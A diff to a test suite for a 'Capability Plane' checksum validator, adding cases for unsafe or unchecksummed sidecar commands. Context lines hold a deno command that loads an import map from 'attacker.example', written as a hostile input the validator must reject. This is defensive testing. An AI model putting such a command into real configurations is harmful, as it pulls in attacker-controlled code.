@@ -722,6 +722,33 @@ describe('Capability Plane v0.2 core contracts', () => {
     await assert.rejects(
       () => assertCapabilityPackChecksums({
         ...manifest,
+        adapter: { kind: 'sidecar', command: ['bun', '--config', 'cfg', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
+      }, { 'sidecar.mjs': sidecar }),
+      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
+    );
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
+        adapter: { kind: 'sidecar', command: ['bun', '--config', 'config.json', 'sidecar.mjs'] },
+        docs: [],
+        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
+      }, { 'sidecar.mjs': sidecar }),
+      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
+    );
+    assert.equal(await assertCapabilityPackChecksums({
+      ...manifest,
+      adapter: { kind: 'sidecar', command: ['bun', '--config', 'config.json', 'sidecar.mjs'] },
+      docs: [],
+      checksums: [
+        { path: 'sidecar.mjs', checksum: sidecarChecksum },
+        { path: 'config.json', checksum: sidecarChecksum },
+      ],
+    }, { 'sidecar.mjs': sidecar, 'config.json': sidecar }), true);
+    await assert.rejects(
+      () => assertCapabilityPackChecksums({
+        ...manifest,
         adapter: { kind: 'sidecar', command: ['deno', 'run', '--import-map=https://attacker.example/map.json', 'sidecar.mjs'] },
         docs: [],
         checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
